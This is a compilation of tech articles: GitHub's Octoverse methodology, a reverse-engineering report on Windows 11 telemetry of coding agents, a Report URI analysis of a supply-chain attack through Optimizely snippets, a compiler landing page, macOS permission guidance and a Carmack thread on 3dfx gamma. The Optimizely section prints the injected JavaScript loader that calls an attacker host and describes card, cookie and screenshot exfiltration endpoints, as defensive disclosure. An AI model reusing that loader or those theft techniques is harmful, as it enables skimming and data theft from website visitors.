What doesn’t change

As part of our research this year, we also tracked the emoji developers used most in their repositories. Across every industry we looked at, the rocket 🚀 topped the list, by a wide margin. A fitting symbol for a year of momentum. Developers on GitHub covered more ground this year: more code, more countries, and more industries than we’ve ever measured. None of that activity changes who decides what the code should do. Someone still has to come up with the idea, whether it’s
software that assesses earthquake risk
,
an open record of how online services change their terms and privacy policies
, or
an agent skill that makes an AI answer like a caveman to save on words
. And someone still has to decide whether it works, whether it belongs, and whether it’s good.

What did change is how much easier it is to take an idea from a weekend thought to something real.

The tools will keep changing, and new industries will keep showing up in places we didn’t expect. What a developer chooses to build, and who they build it for, is still theirs to decide. Rocket emoji and all.

Glossary

Agent configuration file:
A repository file that sets up or directs an AI coding agent. Also called an AI configuration file or agentic file. Repositories without one may still use AI.

Agent signal:
An observed sign of agent involvement in telemetry, such as an agent-opened pull request. It is a floor, since not all agent use may be detected.

Agent-started pull request:
A pull request whose first draft came from a coding agent that we can detect.

Auto model selection:
A GitHub Copilot setting where Copilot picks the model for the task.

Commit:
A saved snapshot of changes to a repository.

Contributions:
Activity events: commenting on a commit, issue, pull request, or discussion; creating a gist, issue, pull request, or discussion; pushing code; and reviewing a pull request. Each push counts once, however many commits it holds. Open-source contributions are contributions to public and open source repositories.

Contributors:
GitHub users with at least one contribution in the period.

Copilot cloud agent:
A GitHub Copilot feature where a developer assigns a task and an agent works on it independently.

Dependabot:
GitHub’s automated tool that finds outdated or vulnerable dependencies and opens pull requests to update them.

Developer-selected request:
A model request where we proxied the developer chose the model. It excludes auto model selection, staff usage, duplicate monitoring and testing requests, background utility models, and requests made with a developer’s own API key.

GitHub Actions job:
A single unit of work in a GitHub Actions workflow.

GitHub Advanced Security:
GitHub’s suite of application security features, including code scanning, secret scanning, and dependency review.

NAICS:
The North American Industry Classification System, the standard sector taxonomy used this year to classify public repositories by industry.

Project HydraFusion:
A GitHub research preview of model orchestration, which plans a task across models, such as one drafting, another reviewing, and a more capable one stepping in when needed. Now generally available as GitHub Copilot Fusion.

Push:
Sending saved changes to GitHub. One push can carry many commits.

Stacked pull requests:
A review workflow that splits related work into a sequence of smaller pull requests that are reviewed in order.

Methodology

Scope and window.
The Octoverse year runs October 1, 2025 to September 30, 2026, inclusive. Unless noted, metrics include public and private repositories. Industry, open-source contribution, and open-source project figures are public only. Prior years: 2024 and 2025 figures are recalculated on the same definitions and window, so they may differ from earlier reports, which covered public activity and a September 1 to August 31 window.

Pushes, commits, and contributions.
A push sends one or more commits to GitHub. Contributions count each push once, so commit totals can exceed contribution totals. Actions are counted in jobs, not minutes. Open-source contributions (2.5 billion) are public.

Filtering.
Contributor and contribution counts exclude spam-flagged accounts, staff, and bots where identifiable.

Geography and projections.
Developers are mapped to countries by self-reported location, with a 100-developer publication threshold. Octoverse 2025 published 2030 totals, not annual targets. Progress is net developers added from September 2025 to September 2026 as a share of the distance from each country’s published 2025 count to its 2030 projection.

Languages.
Contributors are distinct accounts each month that took part through pushes, pull requests, issues, reviews, or comments, attributed to each repository’s primary language (Linguist). An account can count in several languages. This follows the Octoverse 2025 method. Forecasts cover the top 10 languages by average monthly participation and project to September 2027 (mean shown).

The
language bubble chart
compares growth in monthly participating accounts between September 2025 and September 2026 with the share of merged pull requests with detected AI involvement. Bubble size reflects community size.

Top countries by pushes to public repositories, adjusted by profile location.
Pushes from each country were summed across the Octoverse year. To adjust for biases caused by VPN usage, LLM classification was used to extract the ISO 3166-1 alpha-2 code from the profiles of GitHub users who contributed pushes during this period, which were then used to construct ratios of ISO 3166-1 alpha-2 codes based on profile location vs. ISO 3166-1 alpha-2 codes based on IP address. These ratios were then used to weight the pushes from each country.

Industry.
Public repositories created 2022 to 2026 were sorted into NAICS sectors by a fine-tuned multilingual embedding model using name, description, topics, and README, from random samples per year. AI mentions and agent-opened pull requests (detectable agents only) were flagged as separate signals. Sector and AI-mention shares can be related because both read the same text. Shares are estimates.

Open source rankings.
We ranked public, non-fork repositories two ways. “Fastest-growing” ranks by the absolute year-over-year increase in distinct contributing accounts, not contribution counts. “Most engaged” blends a repository’s rankings for stars, forks, and distinct pull request and issue creators. We excluded forks, repositories whose activity reflects redistribution and results we identified as spam. Projects are grouped by governance: community and independent projects are foundation-hosted or independently run, and single-vendor projects follow one company’s product direction. Several community-hosted projects have commercial backers. The split describes governance and hosting, not funding or who employs maintainers.

Model choice.
Figures cover GitHub Copilot and count developer-selected requests only. They exclude auto model selection, staff usage, duplicate monitoring requests, background utility models, and requests made with a developer’s own API key. Each model needs at least 1,000 weekly active users to count. Models are grouped by what they are built for, with examples listed alphabetically by provider:

Deep reasoning and planning:
Claude Opus 5.5, GPT 5.5.

General purpose:
Claude Sonnet 5, Grok 4.7, GPT 6.1 Sol.

Fast and lightweight:
Claude Haiku 5.5, Gemini 3.8 Flash, GPT 6 Luna.

Figures describe observed use, not model quality. Trend observations use weekly data from July 14 to October 13, 2026.

Request share
is the share of all qualifying requests per model group in a 7-day period ending October 13, 2026.

Interoperability.
Counts public repositories created each year whose name, description, topics, or README mention interoperability or reverse engineering, or related terms, such as clean room implementation, drop-in replacement, or protocol re-implementation.

Forecasts.
We ran 43 time-series and regression models on historical GitHub data, sign-ups, product usage, and market sizing, projecting developers on GitHub to September 2031 relative to September 2026. Outcomes group as 3x or more (21 models), 2x to under 3x (19), and under 2x (3). Octoverse 2025 used five models. No forecast is perfectly accurate.

Edited Nov. 6, 2026, to clarify the methodology language for open source rankings.

The post
Octoverse: Commits, pushes, reach new highs in 2026 as developers build with agents
appeared first on
The GitHub Blog
.

title: Windows 11 is collecting data on which coding agents and developer tools you use
content:
Windows 11 Is Collecting Data on Which Coding Agents and Developer Tools You Use

Reverse engineering Windows 11's MissionControlAggregator reveals coding-agent and developer-tool usage bits in a diagnostic ETW report.

I recently asked AI to help me look through the latest Windows binaries for undocumented features and functionality. Among the leads it turned up, one list immediately caught my attention: coding agents such as
codex.exe
,
claude.exe
,
copilot.exe
, and
cursor.exe
, alongside familiar developer tools such as
python.exe
,
dotnet.exe
,
gcc.exe
, and
code.exe
.

Why would a Windows system DLL need a list of coding agents and developer tools?

The names were in
MissionControlAggregator.dll
. I asked the agent to follow the references and dig into what the DLL actually does. That led from a handful of string comparisons to a running Windows component that records which coding agents and developer tools have been used, saves that information locally, and reports it to Windows Diagnostics. And unless you have opted out of the “optional” diagnostic data (which is enabled by default), the data is uploaded to Microsoft.

I
shared the initial finding on X
. This post includes more details about the investigation behind it.

Following the names

Opening the DLL in
Binary Ninja
made the first lead easy to see. These were explicit executable names embedded in a Windows component:

Following the references showed that the names were used in comparisons. There are four CLI-agent slots checking
copilot.exe
,
claude.exe
,
codex.exe
, and
agy.exe
, with extensionless equivalents on the WSL route. Five desktop-agent slots check
github.exe
,
claude.exe
,
codex.exe
,
cursor.exe
, and
antigravity.exe
.

Here is one of the comparisons against
codex.exe
:

The compiler-generated C++ names are unwieldy, so I will call these functions
executable-name matchers
. For reference, one related matcher is
std::_Func_impl_no_alloc<<lambda_340dfe7e962ab225b6ac33bc664bd54f>, bool, std::basic_string_view<wchar_t, std::char_traits<wchar_t>> const&, Microsoft::Diagnostics::MissionControlAggregator::Utils::AppType>::_Do_call
. The screenshot shows another lambda instantiation performing the same kind of name comparison.

The feature guarding the new agent checks has a particularly direct name:
CLICodingAgentUsage
, feature ID
62580080
.

And the list extends beyond AI agents. The same component checks for
node.exe
,
python.exe
,
dotnet.exe
,
gcc.exe
,
clang.exe
,
gdb.exe
,
javac.exe
,
devenv.exe
, and
code.exe
, among others. Those checks feed broader developer-tool categories. Some of these checks also verify the publisher: the Node.js slot expects
Node.js Foundation
, Python expects
Python Software Foundation
, and the .NET and Visual Studio slots expect
Microsoft Corporation
. The compiler/debugger group containing GCC and Clang has no additional publisher check in this path.

Where does the DLL get this information?

The next question was whether the component scans running processes itself. Following
Aggregator::OnLoad
revealed that it subscribes to existing Windows events instead.

For Windows programs, it consumes
KernelProcess.AppStateChangeSummary
and
Win32kTraceLogging.AppInteractivitySummary
. These provide application identities that its handlers parse and pass to the matchers. For WSL, it consumes
Microsoft.Windows.Lxss.Manager.Exec
and
ExecCritical
, using the
imageName
field. A regular Windows
codex.exe
can therefore reach the CLI-agent checks through the app-state summary route; this is not limited to Linux programs running inside WSL.

The relevant flow looks like this:

Aggregator::OnLoad

├─ WSL Exec / ExecCritical

│  └─ ProcessWslExecEvent → CLI agent matchers

├─ KernelProcess.AppStateChangeSummary

│  └─ ProcessAppStateChangeSummaryEvent → CLI agent matchers

└─ Win32kTraceLogging.AppInteractivitySummary

└─ ProcessAppInteractivitySummaryEvent → desktop agent matchers

Aggregator::OnRelativeTimerExpire

└─ MissionControlAggregatorLogging::ReportCohorts<12,4,5>

└─ Segments.SubCohorts ETW report

Aggregator::OnUnload / intermediate timer

└─ PersistentState::SaveToDisk

A successful match sets a slot in the aggregator’s state. Later,
ReportCohorts<12,4,5>
turns those slots into bitsets and emits a report named
Segments.SubCohorts
. The numbers correspond to twelve broader tool categories, four CLI agents, and five desktop agents.

ETW (Event Tracing for Windows)
is the mechanism carrying that report. In this case, it is a self-describing TraceLogging event. Rather than writing the executable names into every report, the component assigns each category a bit. A set Codex bit means the matching tool was observed during the reporting window.

The source events also include runtime, time in focus, interaction counters, and resource usage. This component appears to discard those details and record only a bitmap of which agents were observed. The report’s timestamps describe the collection window, not how long each agent was used.

Although I found no prompt text or source code in this report, collecting which agents and developer tools someone uses already has significant privacy implications.

Is it actually running on a normal machine?

Strings and code are a useful lead, but I wanted to see the component running. I checked my Parallels Windows 11 ARM64 VM, build
26200.9974
. Its
MissionControlAggregator.dll
was version
10.0.26100.9818
, and
CLICodingAgentUsage
was already enabled as a service experiment. I had not manually enabled the feature.

DiagTrack, the
Connected User Experiences and Telemetry
service, was also already running with its startup type set to
Automatic
. It starts a separate
AggregatorHost.exe
process, and that process loads the DLL. The following administrative PowerShell commands show the service, its child process, and the loaded module:

PS> Get-Service DiagTrack | Format-Table Name,Status,StartType -AutoSize

Name       Status StartType

----       ------ ---------

DiagTrack Running Automatic

PS> Get-Process AggregatorHost | Format-Table ProcessName,Id -AutoSize

ProcessName      Id

-----------      --

AggregatorHost
1500

PS> Get-CimInstance Win32_Service -Filter
"Name='DiagTrack'"
|

Format-List Name,State,StartMode,ProcessId

Name
:
DiagTrack

State
:
Running

StartMode
:
Auto

ProcessId
:

10148

PS> Get-CimInstance Win32_Process -Filter
"Name='AggregatorHost.exe'"
|

Format-List ProcessId,ParentProcessId

ProcessId
:

1500

ParentProcessId
:

10148

PS> tasklist /m MissionControlAggregator.dll

Image Name                     PID Modules

========================= ======== ============================================

AggregatorHost.exe
1500
MissionControlAggregator.dll

The process IDs connect the pieces: DiagTrack runs in process
10148
, which is the parent of
AggregatorHost.exe
, process
1500
; the module listing places
MissionControlAggregator.dll
inside that child.

The public ISO’s baseline VM had the coding-agent feature disabled by image default, so the evidence does not support saying that it is active on every Windows installation. On my ARM64 VM, however, the relevant feature and service were active before the test.

Testing it in practice

To test the finding in practice, I copied
cmd.exe
to a file named
codex.exe
and ran it in the interactive Windows session. The name alone was enough for the component to recognize it as Codex.

I captured an
AppStateChangeSummary
for the running process from the
KernelProcess
provider (
{2839ff94-8f12-4e1b-82e3-af7af77a450f}
), with
LaunchCount=1
and
TerminateCount=0
. The aggregator’s saved state contained the value
2
in CLI slot 2, the Codex slot. A separate run without an additional ETW trace also set that slot, confirming that detection worked through Windows’ existing diagnostic collection.

That state is persisted in:

C:\ProgramData\Microsoft\Diagnosis\AggregatorStorage\MissionControlAggregator$

The report normally follows a roughly daily boundary. To capture it immediately, I temporarily moved the saved reporting-window start 25 hours into the past and restarted DiagTrack with a trace listening for the aggregator. The resulting
Segments.SubCohorts
event contained:

Provider: Microsoft.Windows.MissionControlAggregator

Time:     2026-11-16T12:34:29.125116Z

Version:  0.1.5

CliAgentSubCohorts:     4

DesktopAgentSubCohorts: 0

FlushedFromSave:       true

The value
4
is
1 << 2
: the Codex CLI bit. The name had made it through the input summary, the matcher, the persisted state, and the emitted report.

I also tested the developer-tool path separately, using a copy of
cmd.exe
named
gcc.exe
. It set developer-tool slot 3. With optional diagnostic data allowed, I found the resulting
Segments.SubCohorts
event in DiagTrack’s upload queue with
SubCohorts: [8]
(
1 << 3
). This is the compiler/debugger category shared by GCC, Clang, and related tools, rather than a separate bit for each executable.

Following the report toward Microsoft

An ETW event by itself would not establish that anything leaves the machine. ETW is used for plenty of local diagnostics. The more revealing question was who was listening to this particular report.

The VM already had a
Diagtrack-Listener
session subscribed to both ends of the path. These PowerShell queries showed its subscriptions:

Get-EtwTraceProvider -SessionName Diagtrack-Listener `

-Guid
'{2839ff94-8f12-4e1b-82e3-af7af77a450f}'

Get-EtwTraceProvider -SessionName Diagtrack-Listener `

-Guid
'{00de11a2-ec06-58e5-1a2b-21bb21dbee4b}'

The first subscription, for
KernelProcess
, had
MatchAnyKeyword=0x400000000002
, which includes the summary’s
0x400000000000
keyword. The second, for
Microsoft.Windows.MissionControlAggregator
, had
MatchAnyKeyword=0xe00000000000
, which includes the report’s
0x800000000000
keyword. Both had level
255
.

The subscription showed where the report could go. To check whether Windows actually queued it for transmission, I inspected DiagTrack’s
EventStore.db
and decompressed the JSON batches in its
AsimovEvents
table. This revealed an important condition: the agent-usage report is treated as
optional diagnostic data
.

When optional diagnostic data is allowed (enabled by default in the US setup I tested), Windows queues the coding-agent usage report for upload to Microsoft.
I verified this by finding the agent event itself in DiagTrack’s upload queue:

{

"name"
:
"Microsoft.Windows.MissionControlAggregator.Segments.SubCohorts"
,

"ext"
: {

"privacy"
: {
"isRequired"
:
false
}

},

"data"
: {

"Version"
:
"0.1.5"
,

"CliAgentSubCohorts"
: [
4
],

"DesktopAgentSubCohorts"
: [
0
],

"FlushedFromSave"
:
true

}

}

I checked this with a clean installation of Windows 11 Home ARM64 using the latest official ISO, with the region set to the United States. Before changing any privacy settings, the
Diagnostic data
toggle was already enabled and labeled
Include Optional
. After completing setup with those defaults,
AllowTelemetry
was
3
, confirming that optional diagnostic data was enabled.

Optional diagnostic data is therefore enabled by default, at least in the US setup I tested. If you did not opt out of it during installation or disable optional diagnostic data later, it is still enabled and your coding agent usage data is being uploaded. You can decline optional diagnostics during setup or turn off
Send optional diagnostic data
later under
Settings → Privacy & security → Diagnostics & feedback
. Microsoft’s
diagnostics and privacy guide
explains how to change it.

title: Optimizely compromised, served malware on Zoom, GitLab
content:
On 16 November 2026, malicious JavaScript was served to visitors of
178 organisations
through the Optimizely Web experimentation platform. The list includes some of the most visited sites in the world:
Zoom, the BBC, CNN, Salesforce, GitLab, IKEA, HSBC, Equifax, Air France-KLM, Ledger and Peacock
.
The malware was a multi-purpose kit. It swapped cryptocurrency wallet addresses for the attacker's, skimmed payment cards, stole cookies and screenshots, and on iPhones and iPads it delivered the
Coruna and DarkSword iOS exploit kits
. Crypto has already been stolen, with verified transactions to the attackers.
This is exactly the kind of attack Report URI is designed to detect.
Our platform can identify unexpected changes to trusted JavaScript, detect new scripts being loaded and reveal suspicious connections to external destinations. In this case, those signals would have exposed the malicious activity, even though the original script was being served from a trusted Optimizely domain. With an appropriate CSP in enforcement mode, organisations could have gone a step further and blocked key parts of the attack before they succeeded.
The important lesson here is that
trusted JavaScript doesn't always remain trustworthy
. A website can be compromised through a third-party dependency without its own code or infrastructure ever being breached.
Most of the malicious code has now been removed. At 21:52 UTC we found it in only 1 of the 188 infected snippets, down from 169 at 20:56 UTC. If your site uses Optimizely Web, or you visited any of the sites below today, read on.
What happened
Optimizely Web works by having each customer load a JavaScript "snippet" from Optimizely's CDN, for example
https://cdn.optimizely.com/js/6395285578973184.js
. The snippet contains Optimizely's code, the customer's experiments and an optional field called
Project JavaScript
(
projectJS
): custom code the customer writes in their Optimizely dashboard, which runs on every page.
The attacker wrote their own code into the Project JavaScript of customer projects, and the rest of each snippet was untouched. The file was still served from
cdn.optimizely.com
, with Optimizely's certificate, from a host that every affected site already trusted. Here is what was added to Zoom's snippet:
"projectJS": function(){(function(){try{var s=document.createElement('script');s.src='https://1688360.cc/track.js';s.async=true;(document.head||document.documentElement).appendChild(s);}catch(e){}})();
We saw three versions of the injected loader:
A plain
<script>
tag
pointing at
https://1688360.cc/track.js
(most snippets).
The same URL hidden in base64
with
atob()
. A search for "1688360.cc" won't find it. Smartsheet's snippet was cleaned at one point and then re-infected with this version, so whoever wrote the code still had access at the time.
A full inline copy of the payload
, which runs through
eval
if
1688360.cc
is blocked.
Some customers serve their snippet from their own domain, such as
opt.scheels.com/js/<id>.js
or
www.vodafone.com.au/js/<id>.js
. Those were affected too, because the content comes from the same Optimizely project.
We don't know how the attacker got write access
to so many unrelated customer projects: a compromised Optimizely system, a compromised credential with cross-customer access, or something else. That's for Optimizely to explain. To be clear, Optimizely's CDN served exactly what it was given; this was not a CDN cache-poisoning attack. Optimizely's own sites were affected as well: the snippets for
www.optimizely.com
and
login.optimizely.com
both carried the code.

The payload was rebuilt
26 times
during the day. The attacker added features, and added wallets but never removed any.
What the payload does
Every visitor received the same script,
track.js
, and every part of it was active at once. What a visitor experienced depended on their device and what they did on the page.
1. Crypto address swapping (already stealing money)
The script finds any valid wallet address (BTC, ETH and EVM chains, TRON, Solana, TON, Litecoin, Bitcoin Cash, Dogecoin) and replaces it with one of the attacker's. It validates checksums so it only swaps real addresses. It swaps them in:
page text, form fields, links and images;
the clipboard, on copy and through
navigator.clipboard
;
outgoing
fetch
/XHR requests,
window.open
, navigation and the iOS share sheet.
It re-scans the page whenever it changes. Copy an address from any affected page, or from anywhere else while that tab is open, and you may paste the attacker's.
2. Card skimming
Added at 13:43 UTC. The script watches form submissions and every
fetch
/XHR POST for a card number (Luhn-checked), expiry date and CVV. When it has all three, it sends them to
https://1688360.cc/card.php
with
navigator.sendBeacon
. Cards entered in hosted payment iframes (Stripe, Adyen and similar) were out of its reach. Cards typed into a site's own form fields were not.
When it swaps an address next to wallet or payment wording, it sends the following to
https://1688360.cc/hit.php
:
the page URL;
document.cookie
(cookies not marked
HttpOnly
);
the original addresses it replaced;
a screenshot of the page, rendered with html2canvas.
4. iOS exploit kits: Coruna and DarkSword
On iPhones and iPads the script loads
boot.js
from
5vobauua3ojpklx.icu
and
eil786npto9u5bq.icu
. It reads the iOS version and loads an exploit chain in a hidden iframe:

Chain

13 to 17

(

/JIUJIU888/index.js
)

18.x

DarkSword
(
/B9/
,
/D11/
,
/D12/
)

26

Separate chain (
/C10/
); currently only fingerprints the device

The Coruna loader is byte-identical to a sample we analysed in October from a different campaign. The kit's own comments say iOS 18.7.3 and later, and 26.3 and later, are patched. Pages on iOS 18.6 or earlier reload every 60 seconds to retry the exploit, which is a visible symptom.

Who was affected
We fetched

188 snippets belonging to 178 organisations were infected.
We kept a copy of every infected file, along with its response headers, SHA-256 hash and fetch time as evidence. The real number is likely higher as we could only check snippets we could find in time.

Every one of these needs only a CSP in Report-Only mode, so nothing on the site breaks:

Your Optimizely snippet's fingerprint changing, plus a brand-new script with no matching known file. The JS Time Machine shows when the new version first appeared and how long it was served.

Threat Intelligence

Reports naming
5vobauua3ojpklx.icu

webshell.lol

1688360.cc

It's possible to go even further and deploy a CSP that could actively block these attacks and prevent any data breach happening. The websites affected by this attack weren't necessarily running vulnerable code of their own, they were loading JavaScript from a provider they trusted, and that trust was exploited. This is why monitoring what runs in your visitors' browsers is so important. Report URI gives organisations the visibility to detect when trusted dependencies change or behave unexpectedly, and the tools to help enforce policies that prevent malicious scripts and connections from succeeding.

The malicious code arrived from the trusted host itself. What separated the 24 protected sites from the rest was a restrictive
script-src
. A site that lists only the hosts it needs blocks
1688360.cc
. Two common settings let it straight through:
'strict-dynamic'
: any script the trusted Optimizely snippet inserts is trusted too.
'unsafe-eval'
, which Optimizely's own documentation tells customers to allow: the inline-fallback version ran through
eval
even where
track.js
was blocked. That is what happened at HSBC. Its CSP blocked
track.js
and the data theft, but the inline copy still ran.
connect-src
matters.
The 17 "partial" sites blocked card, cookie and screenshot theft because they restrict where the page can send data. That doesn't stop address swapping, which happens inside the page.
What to do now
If your site uses Optimizely Web:
Open every project's
Project JavaScript
and every experiment's custom code. Look for
1688360.cc
,
atob(
and any script you didn't write.
Review who and what has write access to your Optimizely account (users, API tokens, integrations) and rotate credentials.
If you have card fields in your own forms, treat cards entered on 16 November as potentially exposed.
Treat any session tokens or secrets in non-
HttpOnly
cookies as exposed, and rotate them.
Deploy a CSP. Restrict
connect-src
, avoid
'unsafe-eval'
where you can, and turn on reporting.
Consider if you need to communicate to your customers about having served them malware.
If you visited an affected site on 16 November:
Update your iPhone or iPad
to iOS 18.7.3 or later, or iOS 26.3 or later.
Check any crypto transfer
you made. If the address you pasted doesn't match the one you meant to pay, it may have been swapped.
Watch your card statements
if you paid by card on an affected site.

title: Nimony: A New Compiler for Nim
content:
Nimony

Efficient, expressive, elegant

Get the nightly toolchain

Built every day from nimony’s
master
branch.

Linux

x86_64 · tar.xz

Linux

ARM64 · tar.xz

macOS

Apple silicon · tar.xz

Windows

x86_64 · zip

Unpack, put
bin/
on your
PATH
, done — and with

nimony n
you do not even need a C compiler.

Download page
·

Build from source
·

Tools

Nimony
is a new compiler for Nim and the home of the
Nim 3
language: borrow checking, explicit nilability, sum types, checked generics and more, with
incremental
and
parallel
builds from the start. For how it relates to Nim 2, see the
FAQ
.

Nimony for…

Embedded development

Native code generation
for x86_64, ARM64, ARM32, AVR and RISC-V — independent of LLVM and GCC, so there are fewer surprises from the implicit assumptions about C’s undefined behavior that plague these toolchains.

A runtime
hardened against heap exhaustion
: running out of memory is a condition you handle, not a crash.

A
structured, typesafe inline assembler
that uses Nim’s own syntax.

Memory safe
thanks to optimized automatic reference counting and a variant of borrow checking that is easy to understand.

Provable absence of out-of-bounds indexing.
Indexing into arrays,
seq
s and
string
s is a
requires
contract checked at the call site: an index that is provably out of range is a compile-time error, and a module with
{.feature: "staticContracts".}
must prove
every
access in bounds — no buffer overruns and no run-time checks left in the binary. Your own routines state their preconditions the same way.

Game development

Standalone binaries
optimized for your target architecture.

.passive
procs turn
linear code into state machines
— ideal for splitting game logic across frames.

Mutable state
is well supported, not an afterthought.

Short feedback loops.
Incremental and parallel builds keep the edit–compile–fix cycle fast.

Full stack development

A single language for the full stack.
No matter how low level or high level your tasks are: get familiar with Nimony and end up with readable, maintainable code. The same code base compiles to C, to native code, to JavaScript and to WebAssembly — from microcontrollers to the browser.

Batteries included.
The standard library ships what applications need: linear-time regular expressions, sockets with a TLS 1.3 client written in Nim, an HTTP client and server, JSON and a math library.

The compiler as a reviewer.
Generics are type checked where they are
defined
, sum types are matched exhaustively, and the borrow checker rejects mutation under active borrows. Whole classes of plausible-looking mistakes become compile errors, pointing at the line that caused them.

Little ceremony.
Nim’s concise, indentation-based syntax means less code to write and less code to review.

Compiler and tool developers

Built around
NIF
, an interchange format that every stage of the pipeline reads and writes. You can inspect, diff and transform the output of any stage — and it is what makes incremental and parallel builds possible.

Plugins
go far beyond what a macro system can accomplish easily:

Custom validators
that look for possible
deadlocks
,
race conditions
or risky
recursion
(embedded targets often have very small stacks).

Custom code generators
that compile a
subset of Nim to GPUs
or target
FPGAs
.

Custom DSLs
, supported more cleanly than in Nim today — for example
lexer
and
parser generators
.

Here is a taste of the language.

Sum types (algebraic data types)
Variant objects no longer need a separate discriminator enum: tags live in the
case
section, and
`case value of Tag(fields):`
pattern matching binds the fields for that arm — like expressions you’d write in ML-family languages, checked for exhaustiveness.

title: If an App Asks for Full Disk Access or System and App Protection Override
content:
If an app asks for Full Disk Access or System & App Protection Override on your Mac

Starting in macOS 27.3, when some apps ask for Full Disk Access or System & App Protection Override, you have the option to choose only specific protected folders or apps for the app to access. This puts you in control of what data is accessible to the app.

Why apps ask for these permissions

Apps that might ask for Full Disk Access or System & App Protection Override include backup apps, disk cleaners, file indexers, security apps, and others. While some of these apps operate best when granted broader access, others may ask for the same level of access even when they don't need it. It's important to understand the risks of granting broad access to any app, so you can make informed decisions about your own data and privacy.

When you give an app Full Disk Access instead of choosing only specific protected folders for it to access, it can bypass system protections and access all of the files on your Mac, including your messages, emails, photos and videos, data from other user accounts, and more. It can read, change, delete, and export this data without asking.

When you give an app System & App Protection Override, you can choose specific apps for it to control. If you allow it to bypass system protections instead, it can fully control your Mac and apps, which allows it to access all of your data. It can also see every window and app, including ones in the background, and capture every keystroke.

What you can do

An app might ask you to give it access to all of the files on your Mac, or to let it control your Mac. When you turn on access for the app in Privacy & Security settings, depending on the app, your Mac prompts you to:

Allow or not allow the app to have access. This option appears for some apps, such as backup apps that ask for Full Disk Access, and screen readers and voice control tools that ask for Accessibility.
Choose specific protected folders or apps for the app to access instead. This option appears for other apps that ask for Full Disk Access or System & App Protection Override. It allows the app to access only what you choose, while system protections stay in place for the rest of your data.

If your Mac prompts you to choose specific protected folders or apps

To keep more of your data protected, choose specific protected folders or apps for the app to access instead of bypassing system protections.

Choose specific protected folders or apps

When your Mac prompts you, click Choose Folder or Choose Apps, then:

Check the app's setup instructions for information about which protected folders or apps it needs.
Choose only the protected folders or apps that it needs.
For System & App Protection Override, choose whether the app needs to ask for your permission before it controls each app. Use the menu next to each app to choose Ask First or At Any Time.
If you're not sure which protected folders or apps to choose,
contact the app developer
. To stay protected, wait until you're sure which folders or apps that the app needs before giving access.

You can change which protected folders or apps that the app can access at any time.

If you're certain that an app needs Full Disk Access or System & App Protection Override

Bypassing system protections might expose your personal information to an app that doesn't behave as you expect. An app with Full Disk Access can read, change, delete, and export all of the files on your Mac, and an app with System & App Protection Override can fully control your Mac and apps.

If you're certain that the app is from a trustworthy source and needs this level of access, you can give it Full Disk Access or System & App Protection Override permissions by clicking Bypass System Protections:

Confirm each action that the app will be able to take:
Full Disk Access: Read, Change, Delete, and Export All Your Data; View Hidden and Recently Deleted Photos; and Browse As You on Websites.
System & App Protection Override: Read, Change, Delete, and Export All Your Data; View Hidden and Recently Deleted Photos; Browse As You on Websites; Control Your Mac, Apps, and Settings; and Monitor Everything You Do.
If you're absolutely sure that you want to give the app Full Disk Access or System & App Protection Override, click Turn On Full Disk Access or Allow System & App Protection Override, then enter your password and click Modify Settings.

Change or remove an app's access

You can review app permissions in Privacy & Security settings, and change or remove them at any time.

From the Apple menu, choose System Settings.
Click Privacy & Security in the sidebar, then click Files & Folders, Full Disk Access, or System & App Protection Override.
Change an app's access:
Remove an app's access: Select the app, then click the Remove button (−). If asked, enter your password, then click Modify Settings.
Change which protected folders or apps an app can access: In Files & Folders or System & App Protection Override, click the Info button (i) next to the app, make your changes, then click Done.
Limit an app with Full Disk Access or System & App Protection Override to specific protected folders or apps: Remove the app's access, then click the Add button (+) to add the app again. If your Mac prompts you, choose specific folders or apps.

If you remove an app's access, the app might not work as expected.

title: Why 3dfx 1 cards had such a washed out color output?
content:
John Carmack
@ID_AA_Carmack
Both NeXT and 3DFX tried to “do the right thing” with color spaces, and it wound up generally making them look worse than competing options. I didn’t really understand it properly until years later.

It is natural to think that a pixel with a value of 1.0 is emitting twice the photons as a pixel with a value of 0.5, so you can do the obvious linear math to calculate partial pixel coverage, blending a foreground over a background, or interpolating between colors in a texture.

If displays are “linear”, that is correct. NeXT and 3DFX were much closer to linear than other contemporary displays. NeXT had crossover from the deep graphics understanding at Pixar, and 3DFX had the SGI heritage. They did this intentionally.

If you have 10+ bits per channel like the professional rendering systems, linear displays are The Right Thing.

Unfortunately, NeXTStation Colors were 4 bits per channel and 3DFX was 5 or 6 bits per channel, and there… it was not the right thing.

Human eyes aren’t linear intensity sensors. We mostly register relative changes in intensity, so we can tell the difference between 0.01 and 0.02 as a huge doubling, while 0.99 to 1.00 is almost imperceptible.

This distribution of intensities is often referred to as the “gamma” of the display system, but the actual curves like sRGB are a bit more complicated.

If you only have a small number of discrete pixel values, you definitely don’t want to spread them evenly from 0 to 1! If you do, you will have good precision in the brights, but very stark “intensity bands” in the dark colors.

If everything was authored specifically for 3DFX, you would still have the fundamental problem with the dark bands, but more accurate blending and filtering. The problem was that artists made all of their textures in paint programs on conventional non-linear displays, so when they were drawn by 3DFX cards, they got the characteristic “washed out color” look.

You can mathematically correct textures for differences in display gamma, but I didn’t really understand the issue back in the glQuake days, and we were so enthralled by the absolute performance of 3DFX that the color fidelity didn’t get as much attention as it should have.

Even today, tons of games don’t properly handle gamma across their textures and render targets. High resolutions and 24 bit color masks most of it, but you still see it in some slight shimmerings in high contrast textures and edges.
Fabien Sanglard
@fabynou
Nov 15
Does anybody know why 3DfX 1 cards had such a washed out color output? In my research, circa '97 I found many people complaining about the colors. Is it gamma? 16-bit color? What can it be?
